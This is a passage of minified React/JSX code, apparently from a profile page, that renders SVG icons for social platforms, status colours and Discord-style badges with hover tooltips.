                fill: "#ae0000",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 32 32",
                width: "24px",
                height: "24px",
                children: (0, c.jsx)("path", {
                  d: "M 14.347656 22.078125 L 13.320313 19.289063 C 13.320313 19.289063 11.652344 21.148438 9.152344 21.148438 C 6.941406 21.148438 5.367188 19.222656 5.367188 16.144531 C 5.367188 12.199219 7.355469 10.789063 9.3125 10.789063 C 12.136719 10.789063 13.03125 12.617188 13.804688 14.957031 L 14.828125 18.164063 C 15.855469 21.277344 17.78125 23.777344 23.328125 23.777344 C 27.304688 23.777344 30 22.558594 30 19.351563 C 30 16.753906 28.523438 15.40625 25.765625 14.765625 L 23.710938 14.316406 C 22.300781 13.996094 21.882813 13.417969 21.882813 12.457031 C 21.882813 11.367188 22.75 10.722656 24.160156 10.722656 C 25.699219 10.722656 26.535156 11.300781 26.664063 12.679688 L 29.871094 12.296875 C 29.613281 9.410156 27.625 8.222656 24.351563 8.222656 C 21.46875 8.222656 18.644531 9.3125 18.644531 12.808594 C 18.644531 14.988281 19.703125 16.367188 22.363281 17.011719 L 24.546875 17.523438 C 26.179688 17.910156 26.726563 18.582031 26.726563 19.511719 C 26.726563 20.699219 25.570313 21.179688 23.390625 21.179688 C 20.152344 21.179688 18.804688 19.480469 18.035156 17.140625 L 16.976563 13.933594 C 15.628906 9.761719 13.480469 8.222656 9.214844 8.222656 C 4.503906 8.222656 2 11.203125 2 16.273438 C 2 21.148438 4.503906 23.777344 8.992188 23.777344 C 12.617188 23.777344 14.347656 22.078125 14.347656 22.078125 Z",
                }),
              });
            case "MyAnimeList":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "24px",
                height: "24px",
                viewBox: "0 0 1024 1024",
                children: [
                  (0, c.jsx)("circle", {
                    cx: "512",
                    cy: "512",
                    r: "512",
                    style: { fill: "#2d4e9d" },
                  }),
                  (0, c.jsx)("path", {
                    d: "M432.49 410.61V590.3l-44.86-.06V479l-43.31 51.29-42.43-52.44-.43 112.75H256V410.65h47l39.79 54.29 43-54.31zm184.06 44.14.53 135.15h-50.45l-.17-61.25h-59.73c1.49 10.65 4.48 27 8.9 38 3.31 8.13 6.36 16 12.44 24.06l-36.37 24c-7.45-13.57-13.27-28.52-18.73-44.42a198.31 198.31 0 0 1-10.82-46.49c-1.81-16-2.07-31.38 2.28-47.19a83.37 83.37 0 0 1 24.77-39.81c6.68-6.25 16-10.67 23.47-14.66s15.85-5.63 23.62-7.66a158 158 0 0 1 25.41-3.9c8.49-.73 23.62-1.41 51-.6l11.63 37.31h-58.78c-12.65.17-18.73 0-28.61 4.46a47.7 47.7 0 0 0-27.26 41l56.81.7.81-38.61h49.26zM701.72 410v141.35L768 552l-9.17 37.87H656.28V409.33z",
                    style: { fill: "#fff" },
                  }),
                ],
              });
            case "Deezer":
              return (0, c.jsx)("svg", {
                fill: "#0ca07c",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 50 50",
                width: "24px",
                height: "24px",
                children: (0, c.jsx)("path", {
                  d: "M 39 14 L 39 16 L 47 16 L 47 14 Z M 21 17 L 21 19 L 29 19 L 29 17 Z M 39 17 L 39 19 L 47 19 L 47 17 Z M 21 20 L 21 22 L 29 22 L 29 20 Z M 39 20 L 39 22 L 47 22 L 47 20 Z M 3 23 L 3 25 L 11 25 L 11 23 Z M 21 23 L 21 25 L 29 25 L 29 23 Z M 30 23 L 30 25 L 38 25 L 38 23 Z M 39 23 L 39 25 L 47 25 L 47 23 Z M 3 26 L 3 28 L 11 28 L 11 26 Z M 21 26 L 21 28 L 29 28 L 29 26 Z M 30 26 L 30 28 L 38 28 L 38 26 Z M 39 26 L 39 28 L 47 28 L 47 26 Z M 3 29 L 3 31 L 11 31 L 11 29 Z M 12 29 L 12 31 L 20 31 L 20 29 Z M 21 29 L 21 31 L 29 31 L 29 29 Z M 30 29 L 30 31 L 38 31 L 38 29 Z M 39 29 L 39 31 L 47 31 L 47 29 Z M 3 32 L 3 34 L 11 34 L 11 32 Z M 12 32 L 12 34 L 20 34 L 20 32 Z M 21 32 L 21 34 L 29 34 L 29 32 Z M 30 32 L 30 34 L 38 34 L 38 32 Z M 39 32 L 39 34 L 47 34 L 47 32 Z M 3 35 L 3 37 L 11 37 L 11 35 Z M 12 35 L 12 37 L 20 37 L 20 35 Z M 21 35 L 21 37 L 29 37 L 29 35 Z M 30 35 L 30 37 L 38 37 L 38 35 Z M 39 35 L 39 37 L 47 37 L 47 35 Z",
                }),
              });
            case "Pintrest":
              return (0, c.jsxs)("svg", {
                fill: "#E60023",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 24 24",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M 12 2 C 6.477 2 2 6.477 2 12 C 2 17.523 6.477 22 12 22 C 17.523 22 22 17.523 22 12 C 22 6.477 17.523 2 12 2 z M 12 4 C 16.418 4 20 7.582 20 12 C 20 16.418 16.418 20 12 20 C 11.264382 20 10.555494 19.892969 9.8789062 19.707031 C 10.09172 19.278284 10.282622 18.826454 10.386719 18.425781 C 10.501719 17.985781 10.972656 16.191406 10.972656 16.191406 C 11.278656 16.775406 12.173 17.271484 13.125 17.271484 C 15.958 17.271484 18 14.665734 18 11.427734 C 18 8.3227344 15.467031 6 12.207031 6 C 8.1520313 6 6 8.7215469 6 11.685547 C 6 13.063547 6.73325 14.779172 7.90625 15.326172 C 8.08425 15.409172 8.1797031 15.373172 8.2207031 15.201172 C 8.2527031 15.070172 8.4114219 14.431766 8.4824219 14.134766 C 8.5054219 14.040766 8.4949687 13.958234 8.4179688 13.865234 C 8.0299688 13.394234 7.71875 12.529656 7.71875 11.722656 C 7.71875 9.6496562 9.2879375 7.6445312 11.960938 7.6445312 C 14.268937 7.6445313 15.884766 9.2177969 15.884766 11.466797 C 15.884766 14.007797 14.601641 15.767578 12.931641 15.767578 C 12.009641 15.767578 11.317063 15.006312 11.539062 14.070312 C 11.804063 12.953313 12.318359 11.747406 12.318359 10.941406 C 12.318359 10.220406 11.932859 9.6191406 11.130859 9.6191406 C 10.187859 9.6191406 9.4296875 10.593391 9.4296875 11.900391 C 9.4296875 12.732391 9.7109375 13.294922 9.7109375 13.294922 C 9.7109375 13.294922 8.780375 17.231844 8.609375 17.964844 C 8.5246263 18.326587 8.4963381 18.755144 8.4941406 19.183594 C 5.8357722 17.883113 4 15.15864 4 12 C 4 7.582 7.582 4 12 4 z",
                  }),
                ],
              });
            case "Linkedin":
              return (0, c.jsxs)("svg", {
                fill: "#0072b1",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 30 30",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M15,3C8.373,3,3,8.373,3,15c0,6.627,5.373,12,12,12s12-5.373,12-12C27,8.373,21.627,3,15,3z M10.496,8.403 c0.842,0,1.403,0.561,1.403,1.309c0,0.748-0.561,1.309-1.496,1.309C9.561,11.022,9,10.46,9,9.712C9,8.964,9.561,8.403,10.496,8.403z M12,20H9v-8h3V20z M22,20h-2.824v-4.372c0-1.209-0.753-1.488-1.035-1.488s-1.224,0.186-1.224,1.488c0,0.186,0,4.372,0,4.372H14v-8 h2.918v1.116C17.294,12.465,18.047,12,19.459,12C20.871,12,22,13.116,22,15.628V20z",
                  }),
                ],
              });
            case "Tumblr":
              return (0, c.jsxs)("svg", {
                fill: "#34526f",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 30 30",
                width: "24px",
                height: "24px",
                children: [
                  "    ",
                  (0, c.jsx)("path", {
                    d: "M24,4H6C4.895,4,4,4.895,4,6v18c0,1.105,0.895,2,2,2h18c1.105,0,2-0.895,2-2V6C26,4.895,25.105,4,24,4z M20,21.714 c0,0.055-0.022,0.11-0.066,0.143C19.879,21.912,18.305,23,15.429,23C11.979,23,12,18.87,12,18.429v-4.571H9.913 c-0.111,0-0.199-0.088-0.199-0.199v-1.899c0-0.088,0.045-0.154,0.121-0.187c0.033-0.011,3.307-1.453,3.307-4.373 C13.143,7.088,13.231,7,13.342,7h1.889c0.11,0,0.198,0.088,0.198,0.199v4.373h3.23c0.099,0,0.199,0.088,0.199,0.199v1.889 c0,0.11-0.099,0.198-0.199,0.198h-3.23v4.571c0,0.066-0.105,1.456,1.371,1.456c1.213,0,2.88-0.397,2.891-0.397 c0.066-0.045,0.143-0.045,0.199-0.011C19.955,19.51,20,19.576,20,19.653V21.714z",
                  }),
                ],
              });
          }
        },
        N = function (e) {
          switch (e) {
            case "online":
              return "border-green-600";
            case "idle":
              return "border-yellow-600";
            case "dnd":
              return "border-red-600";
            case "offline":
              return "border-slate-600";
          }
        },
        M = (0, c.jsx)(c.Fragment, {
          children: (0, c.jsxs)("div", {
            className:
              "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear",
            children: [
              (0, c.jsx)("svg", {
                version: "1.0",
                xmlns: "http://www.w3.org/2000/svg",
                width: "24",
                height: "24",
                viewBox: "0 0 256.000000 256.000000",
                preserveAspectRatio: "xMidYMid meet",
                children: (0, c.jsxs)("g", {
                  transform:
                    "translate(0.000000,256.000000) scale(0.100000,-0.100000)",
                  fill: "#ff00e0",
                  stroke: "none",
                  children: [
                    (0, c.jsx)("path", {
                      d: "M1103 2295 c-307 -56 -577 -260 -713 -540 -78 -160 -95 -238 -95 -440 0 -186 12 -248 76 -398 107 -252 360 -476 624 -552 36 -11 75 -31 96 -50 56 -50 115 -68 206 -63 84 5 128 22 178 68 17 16 57 35 90 45 262 74 517 299 624 552 65 152 76 211 75 403 0 208 -15 277 -94 435 -139 281 -387 472 -695 536 -105 22 -265 24 -372 4z m364 -81 c169 -35 324 -117 448 -239 159 -155 245 -326 275 -546 34 -241 -48 -513 -213 -709 -86 -102 -235 -208 -359 -254 l-66 -25 4 77 c8 114 8 114 75 145 131 62 222 191 223 317 l1 65 -55 -1 c-606 -15 -746 -15 -924 -5 -160 9 -201 9 -208 -1 -16 -23 0 -118 30 -181 45 -94 127 -169 244 -220 l55 -24 1 -49 c1 -27 4 -66 8 -87 3 -20 3 -37 1 -37 -21 0 -179 76 -235 114 -423 281 -534 855 -249 1281 122 182 346 333 567 380 90 19 283 19 377 -1z m-362 -1258 c105 -2 298 -1 430 3 132 4 242 6 244 4 10 -8 -23 -86 -52 -125 -29 -38 -129 -118 -147 -118 -4 0 -10 27 -13 60 -11 126 -40 140 -287 140 -251 0 -278 -14 -288 -150 l-5 -69 -59 30 c-74 37 -133 96 -164 162 -36 78 -36 77 64 72 48 -3 173 -7 277 -9z m375 -131 c15 -18 8 -313 -9 -367 -15 -46 -54 -94 -93 -114 -41 -21 -156 -21 -197 0 -43 23 -87 87 -100 147 -15 70 -14 322 1 337 19 19 382 17 398 -3z",
                    }),
                    (0, c.jsx)("path", {
                      d: "M803 1950 c-73 -19 -147 -52 -158 -70 -9 -15 3 -47 20 -54 8 -3 38 5 67 18 72 31 135 46 208 47 49 1 64 6 75 22 10 14 11 25 4 39 -13 24 -118 24 -216 -2z",
                    }),
                    (0, c.jsx)("path", {
                      d: "M1539 1948 c-18 -33 15 -54 87 -57 70 -2 132 -17 202 -47 29 -13 59 -21 67 -18 17 7 29 39 20 54 -23 36 -202 90 -301 90 -55 0 -65 -3 -75 -22z",
                    }),
                    (0, c.jsx)("path", {
                      d: "M922 1648 c-7 -7 -12 -24 -12 -38 0 -18 -8 -31 -26 -40 -53 -29 -71 -115 -34 -163 11 -14 46 -35 78 -47 63 -24 75 -36 61 -62 -14 -27 -61 -23 -89 7 -14 15 -33 25 -45 23 -44 -6 -22 -86 31 -110 15 -7 24 -20 24 -34 0 -37 11 -54 36 -54 25 0 44 26 44 59 0 11 9 22 21 26 29 9 59 63 59 106 0 30 -7 43 -35 68 -20 17 -48 34 -63 37 -33 8 -72 31 -72 44 0 15 31 40 50 40 11 0 33 -14 50 -30 25 -25 34 -28 50 -20 37 20 16 82 -37 109 -14 7 -23 21 -23 36 0 42 -42 69 -68 43z",
                    }),
                    (0, c.jsx)("path", {
                      d: "M1588 1649 c-10 -5 -18 -21 -18 -35 0 -16 -14 -38 -40 -63 -34 -32 -40 -44 -40 -78 0 -56 28 -88 101 -114 64 -24 79 -40 59 -64 -20 -24 -67 -19 -86 11 -12 18 -24 24 -43 22 -50 -6 -32 -84 24 -110 16 -7 25 -21 27 -41 2 -16 11 -35 21 -41 25 -16 51 4 55 41 2 20 11 34 27 41 53 24 74 104 41 154 -9 14 -35 33 -59 42 -99 41 -110 52 -82 80 24 24 51 20 85 -14 37 -36 44 -37 64 -9 13 19 13 25 1 50 -8 15 -28 36 -45 46 -19 11 -30 25 -30 39 0 21 -24 54 -38 54 -4 0 -15 -5 -24 -11z",
                    }),
                    (0, c.jsx)("path", {
                      d: "M1234 805 c-8 -13 -13 -28 -10 -33 3 -6 -6 -17 -20 -27 -14 -9 -32 -32 -40 -51 -12 -30 -12 -39 0 -69 14 -34 25 -41 109 -74 30 -12 32 -28 4 -45 -13 -8 -22 -5 -45 17 -34 32 -57 34 -72 6 -13 -24 5 -59 46 -85 14 -9 23 -23 20 -30 -8 -21 18 -46 45 -42 18 2 25 10 27 30 2 15 14 34 28 43 14 9 32 32 40 52 14 31 13 38 -3 71 -14 29 -29 41 -73 59 -57 22 -67 38 -38 57 14 8 23 5 46 -17 32 -31 57 -35 70 -9 13 24 -1 57 -37 83 -19 14 -31 32 -31 46 0 12 -9 27 -19 33 -27 14 -28 13 -47 -15z",
                    }),
                  ],
                }),
              }),
              (0, c.jsx)("div", {
                className: "relative flex justify-center z-10",
                children: (0, c.jsx)("div", {
                  className:
                    "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100",
                  style: { backgroundColor: "#42424266" },
                  children: (0, c.jsx)("p", {
                    className: "hidden w-full max-w-2xl group-hover:block",
                    children: "Super Rich",
                  }),
                }),
              }),
            ],
          }),
        }),
        L = function (e) {
          return e.bio_presence.badges.map(function (t) {
            switch (t) {
              case "Active Developer":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", width: "24", height: "24", viewBox: "0 0 24 24", fill: "none", children: (0, c.jsx)("path", { d: "M6.47213 4L4 6.47213V17.5279L6.47217 20H17.5278L20 17.5279V6.47213L17.5279 4H6.47213ZM10.8582 16.4255H8.64551C8.64551 14.5952 7.1567 13.1064 5.32642 13.1064V10.8936C7.1567 10.8936 8.64551 9.40483 8.64551 7.57454H10.8582C10.8582 9.39042 9.96684 10.9908 8.61129 12C9.96684 13.0093 10.8582 14.6096 10.8582 16.4255ZM18.6667 13.1064C16.8364 13.1064 15.3476 14.5952 15.3476 16.4255H13.1348C13.1348 14.6096 14.0263 13.0093 15.3818 12C14.0263 10.9908 13.1348 9.39042 13.1348 7.57454H15.3476C15.3476 9.40483 16.8364 10.8936 18.6667 10.8936V13.1064V13.1064Z", fill: "#2EA967" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Bravery":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { clipRule: "evenodd", d: "m5.01502 4h13.97008c.1187 0 .215.09992.215.22305v9.97865c0 .0697-.0312.1343-.0837.1767l-6.985 5.5752c-.0389.0313-.0847.0464-.1314.0464-.0466 0-.0924-.0151-.1313-.0464l-6.985-5.5752c-.05252-.0424-.08365-.107-.08365-.1767v-9.97865c0-.12313.0963-.22305.21497-.22305zm7.82148 7.0972 4.1275-2.71296c.1039-.06863.2299.04542.1725.15644l-1.7114 3.36192c-.0403.0807.0182.1756.1079.1756h1.0246c.118 0 .1664.1504.0706.219l-4.6267 3.3175c-.0414.0303-.0978.0303-.1402 0l-4.6267-3.3175c-.0948-.0686-.04639-.219.07059-.219h1.02356c.09076 0 .14925-.0949.10791-.1756l-1.71132-3.36293c-.05648-.11001.06958-.22305.17345-.15543l4.12851 2.71296c.0716.0474.1291.112.1674.1887l.6293 1.2636c.0444.0888.1714.0888.2158 0l.6293-1.2636c.0383-.0767.0958-.1423.1674-.1887z", fill: "#9c84ef", fillRule: "evenodd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Brilliance":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { clipRule: "evenodd", d: "m12 20c4.4183 0 8-3.5817 8-8 0-4.41828-3.5817-8-8-8-4.41828 0-8 3.58172-8 8 0 4.4183 3.58172 8 8 8zm.7921-8.275 3.6146-2.3738c.0909-.05916.2013.03974.151.136l-1.4986 2.9416c-.0354.0707.0158.1537.0944.1537h.8973c.1033 0 .1457.1315.0618.1916l-4.0517 2.9027c-.0362.0265-.0856.0265-.1227 0l-4.05168-2.9027c-.08301-.0601-.04062-.1916.06182-.1916h.89634c.07948 0 .1307-.083.09449-.1537l-1.49862-2.9416c-.04945-.09626.06094-.19516.1519-.136l3.61545 2.3738c.0627.0415.113.098.1465.1651l.5511 1.1057c.0389.0777.1501.0777.189 0l.551-1.1057c.0336-.0671.0839-.1245.1466-.1651z", fill: "#f47b67", fillRule: "evenodd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Balance":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { clipRule: "evenodd", d: "m11.8622 4.05696c.076-.07595.1996-.07595.2756 0l7.8048 7.80474c.0371.0362.0574.0865.0574.1377 0 .0513-.0212.1016-.0574.1378l-7.8048 7.8047c-.038.038-.0883.0574-.1378.0574s-.0998-.0194-.1378-.0574l-7.8048-7.8047c-.03709-.0362-.0574-.0857-.0574-.1378s.02031-.1015.0574-.1377zm.9299 8.29474 3.6146-2.37377c.0909-.05917.2013.03977.151.13597l-1.4986 2.9416c-.0354.0707.0158.1537.0944.1537h.8973c.1033 0 .1457.1316.0618.1916l-4.0517 2.9028c-.0362.0265-.0856.0265-.1227 0l-4.05168-2.9028c-.08301-.06-.04062-.1916.06182-.1916h.89634c.07948 0 .1307-.083.09449-.1537l-1.49862-2.9416c-.04945-.0962.06094-.19514.1519-.13597l3.61545 2.37377c.0627.0415.113.098.1465.1651l.5511 1.1057c.0389.0777.1501.0777.189 0l.551-1.1057c.0336-.0671.0839-.1245.1466-.1651z", fill: "#45ddc0", fillRule: "evenodd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Discord Nitro":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("circle", { cx: "15", cy: "12", fill: "#fff", r: "6" }), (0, c.jsx)("path", { clipRule: "evenodd", d: "m2.20812 10.124c.42636 0 .7816-.34817.7816-.76611 0-.41793-.35524-.76615-.7816-.76615h-.42635c-.42636 0-.78177.34822-.78177.76615 0 .41794.35541.76611.78177.76611zm16.13038 9.2643c4.0504-1.811 5.7558-6.4083 3.9083-10.23937-1.2791-2.71657-3.9793-4.31859-6.8217-4.45801h-8.02965c-.71065 0-1.20812.55735-1.20812 1.18425 0 .69645.56859 1.18409 1.20812 1.18409h2.06067c.42635 0 .78158.34822.78158.76616 0 .41793-.35523.76632-.78158.76632h-5.04517c-.42635 0-.78176.34822-.78176.76615 0 .41794.35541.76611.78176.76611h3.62404c.42635 0 .78159.3484.78159.7664 0 .4179-.35524.7661-.78159.7661h-2.27402c-.42636 0-.7816.3482-.7816.7662 0 .4179.35524.7663.7816.7663h1.56336c.07112.8359.2843 1.6717.63954 2.4379 1.77654 3.8311 6.46643 5.5028 10.37463 3.7614zm-7.2725-5.1884c-1.0318-2.2025-.0466-4.80794 2.2003-5.81933 2.2469-1.0114 4.9049-.04564 5.9366 2.15683 1.0318 2.2025.0468 4.8079-2.2003 5.8193-2.2469 1.0114-4.9048.0457-5.9366-2.1568z", fill: "#4f5d7f", fillRule: "evenodd" }), (0, c.jsx)("path", { d: "m16.8142 9.86662 1.4212 2.36838c.0711.1392.0711.2089 0 .3482l-1.4212 2.3683c-.0711.1393-.2131.1393-.2842.1393h-2.7714c-.142 0-.2131-.0697-.2841-.1393l-1.4213-2.3683c-.0709-.1393-.0709-.209 0-.3482l1.4213-2.36838c.071-.13926.2132-.13926.2841-.13926h2.7714c.1422-.06971.2131 0 .2842.13926z", fill: "#c5cedd" })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Early Supporter":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("path", { d: "m16.4823 15.6364h-1.2218c-.7028-.0096-1.3731-.2975-1.8639-.8006s-.7621-1.1803-.7543-1.8831v-1.2509c-.0019-.2803.1071-.5501.3033-.7504s.4636-.3148.744-.3187h5.7382v-1.49815h-10.18186c-.92363 2.08005-1.86909 4.24725-2.18181 5.09095-.20109.4955-.54642.9193-.99121 1.2162-.44479.297-.96854.4535-1.50334.4492v.8946c.40174.4023.87908.7212 1.40455.9384s1.08869.3283 1.65727.327h9.1564c.7008 0 1.373-.2779 1.8693-.7728s.776-1.1663.7779-1.8672v-.1891c-.4132.2695-.8957.4135-1.3891.4146zm-6.1309-2.0437c-.1802.0013-.35663-.0514-.50658-.1513-.14996-.0999-.26654-.2424-.33472-.4092-.06819-.1668-.08484-.3502-.04782-.5265.03702-.1764.12602-.3376.25552-.4629s.2936-.2089.471-.2401c.1775-.0312.3603-.0084.5247.0652.1644.0737.3031.1949.398.3481.0949.1531.1417.3312.1344.5113-.0093.2315-.1074.4506-.274.6118-.1665.1611-.3888.252-.6205.2536z", fill: "#9cb8ff" }), (0, c.jsx)("path", { d: "m19.617 10.6327h-5.92c-.1394.001-.2773.0294-.4057.0836-.1285.0543-.245.1333-.343.2326-.0979.0992-.1753.2168-.2278.346-.0524.1292-.079.2675-.078.4069v1.2509c-.0078.7028.2635 1.38.7543 1.8831s1.1611.791 1.8639.8006h2.7854c.4934-.0011.9759-.1451 1.3891-.4146l.0728-.0436c.3531-.2533.6404-.5876.8378-.9748s.2991-.8161.2967-1.2507v-1.2509c.0039-.2772-.1015-.5448-.2934-.7449s-.4549-.3166-.7321-.3242zm-2.6109 3.8327h-1.1563c-.0626.0081-.1261.0027-.1864-.0157s-.1159-.0495-.1633-.0911c-.0473-.0416-.0853-.0929-.1112-.1503-.026-.0575-.0395-.1198-.0395-.1829 0-.063.0135-.1253.0395-.1828.0259-.0574.0639-.1087.1112-.1503.0474-.0416.103-.0727.1633-.0911s.1238-.0238.1864-.0158h1.1563c.0626-.008.1261-.0026.1864.0158s.1159.0495.1633.0911c.0473.0416.0853.0929.1112.1503.026.0575.0395.1198.0395.1828 0 .0631-.0135.1254-.0395.1829-.0259.0574-.0639.1087-.1112.1503-.0474.0416-.103.0727-.1633.0911s-.1238.0238-.1864.0157zm2.0728 0h-.4437c-.1069-.0137-.2052-.066-.2764-.147s-.1105-.1851-.1105-.293c0-.1078.0393-.2119.1105-.2929s.1695-.1333.2764-.1471h.4437c.0625-.008.126-.0026.1863.0158s.116.0495.1633.0911c.0474.0416.0853.0929.1113.1503.0259.0575.0394.1198.0394.1828 0 .0631-.0135.1254-.0394.1829-.026.0574-.0639.1087-.1113.1503-.0473.0416-.103.0727-.1633.0911s-.1238.0238-.1863.0157z", fill: "#cbdaf7" }), (0, c.jsx)("path", { d: "m17.0061 13.5855h-1.1564c-.0625-.0081-.1261-.0027-.1864.0157s-.1159.0495-.1633.0911c-.0473.0417-.0852.0929-.1112.1503-.026.0575-.0394.1198-.0394.1829 0 .063.0134.1253.0394.1828.026.0574.0639.1087.1112.1503.0474.0416.103.0727.1633.0911s.1239.0238.1864.0158h1.1564c.0625.008.126.0026.1863-.0158s.116-.0495.1633-.0911c.0474-.0416.0853-.0929.1113-.1503.0259-.0575.0394-.1198.0394-.1828 0-.0631-.0135-.1254-.0394-.1829-.026-.0574-.0639-.1086-.1113-.1503-.0473-.0416-.103-.0727-.1633-.0911s-.1238-.0238-.1863-.0157zm2.0581 0h-.4436c-.107.0137-.2052.066-.2765.147-.0712.081-.1105.1851-.1105.293 0 .1078.0393.2119.1105.2929.0713.081.1695.1333.2765.1471h.4436c.0626.008.1261.0026.1864-.0158s.1159-.0495.1633-.0911c.0473-.0416.0853-.0929.1112-.1503.026-.0575.0395-.1198.0395-.1828 0-.0631-.0135-.1254-.0395-.1829-.0259-.0574-.0639-.1086-.1112-.1503-.0474-.0416-.103-.0727-.1633-.0911s-.1238-.0238-.1864-.0157z", fill: "#9cb8ff" }), (0, c.jsx)("path", { d: "m2.62786 15.1709c-.10957-.05-.21639-.1058-.32-.1673v4.2037l1.13455.7927 1.12727-.7927v-3.3164c-.71689.0255-1.41481-.2333-1.94182-.72z", fill: "#ff903e" }), (0, c.jsx)("path", { d: "m6.3152 13.7455c-.1373.345-.34381.6583-.6068.9205-.26298.2622-.57687.4677-.92232.604-.34546.1363-.71516.2004-1.08632.1883-.37117-.012-.73594-.0999-1.07183-.2583.52585.4893 1.22391.7508 1.94182.7273.53666-.0108 1.05762-.1831 1.49485-.4945s.77041-.7473.95606-1.251c.32727-.8291 1.27272-2.9963 2.18182-5.09089h-.92364s-1.25818 2.85819-1.96364 4.65459z", fill: "#d0d9ea" }), (0, c.jsx)("path", { d: "m11.5298 4 .6182.05091z", fill: "#ebeff7" }), (0, c.jsx)("path", { d: "m16.897 7.11273c.8756.02248 1.7483.11 2.6109.26182-.5673-.67636-2.7782-2.90909-7.3527-3.30909 3.309.79273 4.5309 2.67636 4.7418 3.04727zm-10.58184 6.63277c.70545-1.7964 1.96363-4.61095 1.96363-4.61095s2.24001-1.69454 6.85091-1.98545c-1.6073-2.18182-4.2473-2.90909-5.87636-3.08364-5.62182.60364-8.24727 4.87273-8.24727 8.27634-.033091.5186.06957 1.0368.29786 1.5036s.57432.866 1.00396 1.1582c.1036.0615.21042.1173.32.1673.33408.1592.69713.2485 1.06693.2625.36979.014.73856-.0476 1.08372-.181.34517-.1335.65948-.3359.92369-.595.26422-.2591.47278-.5694.61293-.9119zm-4.74909-2.0655c.02458-.5434.26177-1.0553.66042-1.4254.39864-.37006.92678-.5686 1.47049-.55278.53236.11535.99792.43568 1.29598.89158s.40466 1.0109.29674 1.5448c-.02451.5382-.25765 1.0458-.65 1.415-.39235.3693-.91308.5713-1.45181.5632-.26672-.053-.52036-.1581-.74635-.3094-.22599-.1512-.41989-.3456-.57057-.572-.15069-.2263-.25519-.4802-.30751-.7471-.05232-.2668-.05144-.5414.00261-.8079z", fill: "#fff" }), (0, c.jsx)("path", { d: "m16.1552 7.10544c-.3564 0-.7273 0-1.0328.04363-4.6109.29091-6.84359 1.98546-6.84359 1.98546h15.60729c-1.29-.93245-2.7877-1.53654-4.3637-1.76-.8626-.15183-1.7353-.23934-2.6109-.26182z", fill: "#7687b2" }), (0, c.jsx)("path", { d: "m3.18792 14.1164c.54495.0178 1.07495-.1799 1.47517-.5502.40023-.3703.63843-.8833.66301-1.428.10697-.5391-.00456-1.0986-.31006-1.5555s-.77995-.77374-1.31903-.88086c-.5437-.01583-1.07184.18271-1.47049.55276-.39864.3701-.63583.882-.66042 